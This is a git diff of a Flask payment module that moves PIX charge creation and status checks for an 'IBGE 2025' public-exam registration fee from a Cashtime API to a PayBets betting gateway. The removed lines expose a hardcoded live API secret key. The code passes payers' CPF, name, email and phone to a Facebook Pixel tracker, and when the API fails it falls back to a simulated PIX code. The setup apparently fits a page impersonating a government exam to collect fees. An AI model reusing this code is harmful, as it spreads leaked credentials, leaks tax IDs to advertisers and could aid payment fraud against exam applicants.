@@ -316,16 +316,16 @@ def register_routes(app):
 
     @app.route('/gerar-pix', methods=['POST'])
     def gerar_pix():
-        """API para gerar pagamento PIX via Cashtime"""
+        """API para gerar pagamento PIX via PayBets"""
         try:
             data = request.get_json()
-            print(f"[PIX DEBUG] Dados recebidos: {data}")
+            print(f"[PIX DEBUG PayBets] Dados recebidos: {data}")
 
             # Validar dados obrigatórios
             required_fields = ['name', 'email', 'cpf', 'amount']
             for field in required_fields:
                 if not data.get(field):
-                    print(f"[PIX DEBUG] Campo obrigatório ausente: {field}")
+                    print(f"[PIX DEBUG PayBets] Campo obrigatório ausente: {field}")
                     return jsonify({'erro': f'Campo {field} é obrigatório'}), 400
 
             # Verificar limite de pedidos por CPF
@@ -349,104 +349,87 @@ def register_routes(app):
             current_count = PixRequestLimit.get_request_count(cpf_clean)
             print(f"[PIX LIMIT] ✓ Limite OK para CPF {cpf_clean}: {current_count}/8 pedidos")
 
-            print("[PIX DEBUG] Usando Cashtime API...")
-            from cashtime_api import create_cashtime_api
+            print("[PIX DEBUG PayBets] Usando PayBets API...")
+            from paybets_api import PayBetsAPI, PaymentRequestData
             from datetime import datetime, timedelta
             import uuid
 
-            print("[PIX DEBUG] Preparando dados do pagamento...")
-            # Converter valor de centavos para reais para a API Cashtime
+            print("[PIX DEBUG PayBets] Preparando dados do pagamento...")
+            # Converter valor de centavos para reais se necessário
             valor_reais = data['amount'] / 100 if isinstance(data['amount'], int) else data['amount']
 
-            # Preparar dados para Cashtime API
-            cashtime_data = {
-                'name': data['name'],
-                'email': data['email'],
-                'cpf': data['cpf'],
-                'amount': valor_reais,
-                'phone': data.get('phone', '11999999999'),
-                'description': f"Inscrição Concurso Público IBGE 2025 - Valor: R$ {valor_reais:.2f}",
-                'expirationMinutes': 60
-            }
+            # Preparar dados para PayBets API
+            payment_data = PaymentRequestData(
+                name=data['name'],
+                email=data['email'],
+                cpf=data['cpf'],
+                amount=valor_reais,  # PayBets usa valor em reais
+                phone=data.get('phone', '11999999999'),
+                description=f"Inscrição Concurso Público IBGE 2025 - Valor: R$ {valor_reais:.2f}"
+            )
 
-            print("[PIX DEBUG] Gerando PIX via Cashtime...")
+            print("[PIX DEBUG PayBets] Gerando PIX via PayBets...")
             try:
-                # Usar a secret key hardcoded fornecida
-                secret_key = "sk_live_sLJNf4hOupi7EBe8hVKeRW+AENhDiFhdn0m98dZOHgaNXMBHUwgAnDwEyMSFsaX05oLaDklKbjHe+WMR5wzrcX4AXeux7i8joSG6GB1Nk36BSKyrpuvDdHsXq9JzmAm8XtbaaiUPPmhpnfZNiNk/OGq2tl2CtztLJRVUIWLKhno="
-
-                # Criar instância da API Cashtime
-                cashtime_api = create_cashtime_api(secret_key=secret_key)
-
+                # Criar instância da API PayBets  
+                api = PayBetsAPI()
+                
                 # Gerar PIX
-                result = cashtime_api.create_pix_payment(cashtime_data)
+                response = api.create_pix_payment(payment_data)
 
-                if result.get('success'):
-                    print(f"[PIX DEBUG] ✓ PIX Cashtime gerado com sucesso: {result.get('cashtime_id')}")
+                print(f"[PIX DEBUG PayBets] ✓ PIX PayBets gerado com sucesso: {response.transaction_id}")
 
-                    # Track Facebook Pixel PIX generation
-                    user_info = {
-                        'nome_completo': data['name'],
-                        'email': data['email'],
-                        'cpf': data['cpf'],
-                        'phone': data.get('phone', '')
-                    }
-                    facebook_pixel.track_pix_generation(user_info, result.get('cashtime_id'))
+                # Enviar notificação via Pushcut webhook
+                _send_pushcut_notification(data, {
+                    'transaction_id': response.transaction_id,
+                    'amount': response.amount,
+                    'status': response.status
+                })
 
-                    # Registrar pedido no sistema de limite
-                    try:
-                        transaction_id = result.get('cashtime_id')
-                        ip_address = request.remote_addr
-                        user_agent = request.headers.get('User-Agent', '')
+                # Track Facebook Pixel PIX generation
+                user_info = {
+                    'nome_completo': data['name'],
+                    'email': data['email'],
+                    'cpf': data['cpf'],
+                    'phone': data.get('phone', '')
+                }
+                facebook_pixel.track_pix_generation(user_info, response.transaction_id)
 
-                        PixRequestLimit.add_request(
-                            cpf=data['cpf'],
-                            nome_completo=data['name'],
-                            email=data['email'],
-                            transaction_id=transaction_id,
-                            amount=valor_reais,
-                            ip_address=ip_address,
-                            user_agent=user_agent
-                        )
+                # Registrar pedido no sistema de limite
+                try:
+                    ip_address = request.remote_addr
+                    user_agent = request.headers.get('User-Agent', '')
 
-                        updated_count = PixRequestLimit.get_request_count(cpf_clean)
-                        print(f"[PIX LIMIT] ✓ Pedido registrado - CPF {cpf_clean}: {updated_count}/8 pedidos")
+                    PixRequestLimit.add_request(
+                        cpf=data['cpf'],
+                        nome_completo=data['name'],
+                        email=data['email'],
+                        transaction_id=response.transaction_id,
+                        amount=valor_reais,
+                        ip_address=ip_address,
+                        user_agent=user_agent
+                    )
 
-                    except Exception as e:
-                        print(f"[PIX LIMIT] ⚠ Erro ao registrar pedido: {e}")
+                    updated_count = PixRequestLimit.get_request_count(cpf_clean)
+                    print(f"[PIX LIMIT] ✓ Pedido registrado - CPF {cpf_clean}: {updated_count}/8 pedidos")
 
-                    # Gerar QR Code em base64 se não foi fornecido
-                    qr_code_base64 = result.get('qr_code_image')
-                    if not qr_code_base64 and result.get('pix_code'):
-                        import qrcode
-                        import io
-                        import base64
+                except Exception as e:
+                    print(f"[PIX LIMIT] ⚠ Erro ao registrar pedido: {e}")
 
-                        qr = qrcode.QRCode(version=1, box_size=10, border=5)
-                        qr.add_data(result.get('pix_code'))
-                        qr.make(fit=True)
-
-                        img = qr.make_image(fill_color="black", back_color="white")
-                        img_buffer = io.BytesIO()
-                        img.save(img_buffer, format='PNG')
-                        img_str = base64.b64encode(img_buffer.getvalue()).decode()
-                        qr_code_base64 = f"data:image/png;base64,{img_str}"
-
-                    return jsonify({
-                        'success': True,
-                        'payment_id': result.get('cashtime_id'),
-                        'pix_code': result.get('pix_code'),
-                        'pix_qr_code': qr_code_base64,
-                        'expires_at': result.get('expires_at'),
-                        'status': result.get('status', 'pending'),
-                        'pix_real': True,
-                        'cashtime_transaction': True
-                    })
-                else:
-                    raise Exception(result.get('error', 'Erro na API Cashtime'))
+                return jsonify({
+                    'success': True,
+                    'payment_id': response.transaction_id,
+                    'pix_code': response.pix_code,
+                    'pix_qr_code': response.pix_qr_code,
+                    'expires_at': (datetime.now() + timedelta(minutes=30)).isoformat(),
+                    'status': response.status,
+                    'amount': response.amount,
+                    'pix_real': True,
+                    'paybets_transaction': True
+                })
 
             except Exception as api_error:
-                print(f"[PIX DEBUG] ❌ Erro na API Cashtime: {api_error}")
-                print("[PIX DEBUG] Gerando PIX de demonstração como fallback...")
+                print(f"[PIX DEBUG PayBets] ❌ Erro na API PayBets: {api_error}")
+                print("[PIX DEBUG PayBets] Gerando PIX de demonstração como fallback...")
 
                 # PIX de demonstração usando nova implementação
                 import uuid
@@ -457,8 +440,8 @@ def register_routes(app):
                 from datetime import datetime, timedelta
 
                 # Gerar protocolo e PIX simulado
-                protocolo = f"PAY-2025-{random.randint(100000, 999999)}"
-                valor_final = data['amount'] / 100  # Converter de centavos para reais
+                protocolo = f"PAYBETS-2025-{random.randint(100000, 999999)}"
+                valor_final = data['amount'] / 100 if isinstance(data['amount'], int) else data['amount']
 
                 # Usar função melhorada de PIX simulado
                 pix_code_simulado = gerar_codigo_pix_simulado(valor_final, protocolo)
@@ -477,11 +460,11 @@ def register_routes(app):
                 img.save(img_buffer, format='PNG')
                 img_str = base64.b64encode(img_buffer.getvalue()).decode()
 
-                print("[PIX DEBUG] ✓ PIX de demonstração gerado com sucesso")
+                print("[PIX DEBUG PayBets] ✓ PIX de demonstração gerado com sucesso")
 
                 # Registrar pedido no sistema de limite (mesmo para demonstração)
                 try:
-                    demo_payment_id = f"demo_{uuid.uuid4().hex[:12]}"
+                    demo_payment_id = f"paybets_demo_{uuid.uuid4().hex[:12]}"
                     ip_address = request.remote_addr
                     user_agent = request.headers.get('User-Agent', '')
 
@@ -508,13 +491,14 @@ def register_routes(app):
                     'pix_qr_code': f"data:image/png;base64,{img_str}",
                     'expires_at': (datetime.now() + timedelta(minutes=30)).isoformat(),
                     'status': 'pending',
-                    'pix_simulado': True
+                    'pix_simulado': True,
+                    'paybets_demo': True
                 })
 
         except Exception as e:
             import traceback
-            print(f"[PIX ERROR] Erro ao gerar PIX: {str(e)}")
-            print(f"[PIX ERROR] Traceback completo: {traceback.format_exc()}")
+            print(f"[PIX ERROR PayBets] Erro ao gerar PIX: {str(e)}")
+            print(f"[PIX ERROR PayBets] Traceback completo: {traceback.format_exc()}")
             return jsonify({'erro': 'Erro interno do servidor'}), 500
 
     @app.route('/api/verificar-pagamento-pix', methods=['POST'])
@@ -530,49 +514,49 @@ def register_routes(app):
                     'erro': 'ID do pagamento não encontrado'
                 })
 
-            # Verificar se é pagamento de demonstração
-            if payment_id.startswith('demo_'):
-                print(f"[PIX DEBUG] Verificando pagamento de demonstração: {payment_id}")
+            # Verificar se é pagamento de demonstração PayBets
+            if payment_id.startswith('paybets_demo_') or payment_id.startswith('demo_'):
+                print(f"[PIX DEBUG PayBets] Verificando pagamento de demonstração: {payment_id}")
                 return jsonify({
                     'sucesso': True,
                     'status': 'pendente',
-                    'message': 'Pagamento em demonstração - sempre pendente'
+                    'message': 'Pagamento PayBets em demonstração - sempre pendente'
                 })
 
-            # Para pagamentos Cashtime, tentar verificar via API
-            print(f"[PIX DEBUG] Verificando pagamento Cashtime: {payment_id}")
+            # Para pagamentos PayBets, tentar verificar via API
+            print(f"[PIX DEBUG PayBets] Verificando pagamento PayBets: {payment_id}")
             try:
-                from cashtime_api import create_cashtime_api
-                secret_key = "sk_live_sLJNf4hOupi7EBe8hVKeRW+AENhDiFhdn0m98dZOHgaNXMBHUwgAnDwEyMSFsaX05oLaDklKbjHe+WMR5wzrcX4AXeux7i8joSG6GB1Nk36BSKyrpuvDdHsXq9JzmAm8XtbaaiUPPmhpnfZNiNk/OGq2tl2CtztLJRVUIWLKhno="
+                from paybets_api import PayBetsAPI
 
-                cashtime_api = create_cashtime_api(secret_key=secret_key)
-                result = cashtime_api.check_payment_status(payment_id)
+                api = PayBetsAPI()
+                result = api.check_payment_status(payment_id)
 
-                if result.get('success'):
+                if result.get('status') != 'error':
                     return jsonify({
                         'sucesso': True,
                         'status': result.get('status', 'pendente'),
-                        'message': f'Status Cashtime: {result.get("status", "pendente")}'
+                        'message': f'Status PayBets: {result.get("status", "pendente")}',
+                        'paid': result.get('paid', False)
                     })
                 else:
                     # Fallback para pendente se não conseguir verificar
                     return jsonify({
                         'sucesso': True,
                         'status': 'pendente',
-                        'message': 'Pagamento Cashtime - aguardando confirmação'
+                        'message': 'Pagamento PayBets - aguardando confirmação'
                     })
 
-            except Exception as cashtime_error:
-                print(f"[PIX DEBUG] Erro na verificação Cashtime: {cashtime_error}")
+            except Exception as paybets_error:
+                print(f"[PIX DEBUG PayBets] Erro na verificação PayBets: {paybets_error}")
                 # Fallback para pendente
                 return jsonify({
                     'sucesso': True,
                     'status': 'pendente',
-                    'message': 'Pagamento Cashtime - aguardando confirmação'
+                    'message': 'Pagamento PayBets - aguardando confirmação'
                 })
 
         except Exception as e:
-            print(f"[PIX DEBUG] Erro na verificação de pagamento: {str(e)}")
+            print(f"[PIX DEBUG PayBets] Erro na verificação de pagamento: {str(e)}")
             return jsonify({
                 'sucesso': False,
                 'erro': 'Erro interno do servidor'
@@ -580,26 +564,59 @@ def register_routes(app):
 
     @app.route('/verificar-pagamento/<payment_id>')
     def verificar_pagamento(payment_id):
-        """API para verificar status do pagamento (compatibilidade) - PayBets sempre pendente"""
+        """API para verificar status do pagamento PayBets"""
         try:
-            # Para PayBets, sempre retornar pendente
-            if payment_id.startswith('demo_'):
-                status = 'pending'
-                message = 'Pagamento de demonstração'
-            else:
-                status = 'pending'
-                message = 'Pagamento PayBets aguardando confirmação'
-
-            return jsonify({
-                'status': status,
-                'message': message,
-                'payment_id': payment_id,
-                'paid': False,
-                'pending': True,
-                'failed': False
-            })
+            print(f"[PayBets] Verificando status do pagamento: {payment_id}")
+            
+            # Verificar se é pagamento de demonstração
+            if payment_id.startswith('paybets_demo_') or payment_id.startswith('demo_'):
+                return jsonify({
+                    'status': 'pending',
+                    'message': 'Pagamento PayBets de demonstração',
+                    'payment_id': payment_id,
+                    'paid': False,
+                    'pending': True,
+                    'failed': False
+                })
+            
+            # Tentar verificar via PayBets API
+            try:
+                from paybets_api import PayBetsAPI
+                
+                api = PayBetsAPI()
+                result = api.check_payment_status(payment_id)
+                
+                if result.get('status') != 'error':
+                    return jsonify({
+                        'status': result.get('status', 'pending'),
+                        'message': f'Status PayBets: {result.get("status", "pending")}',
+                        'payment_id': payment_id,
+                        'paid': result.get('paid', False),
+                        'pending': result.get('pending', True),
+                        'failed': result.get('failed', False)
+                    })
+                else:
+                    return jsonify({
+                        'status': 'pending',
+                        'message': 'Pagamento PayBets aguardando confirmação',
+                        'payment_id': payment_id,
+                        'paid': False,
+                        'pending': True,
+                        'failed': False
+                    })
+            except Exception as api_error:
+                print(f"[PayBets] Erro na API: {api_error}")
+                return jsonify({
+                    'status': 'pending',
+                    'message': 'Pagamento PayBets aguardando confirmação',
+                    'payment_id': payment_id,
+                    'paid': False,
+                    'pending': True,
+                    'failed': False
+                })
+                
         except Exception as e:
-            print(f"Erro ao verificar pagamento: {str(e)}")
+            print(f"[PayBets] Erro ao verificar pagamento: {str(e)}")
             return jsonify({'erro': 'Erro ao verificar pagamento'}), 500
 
     @app.route('/debug-cashtime')
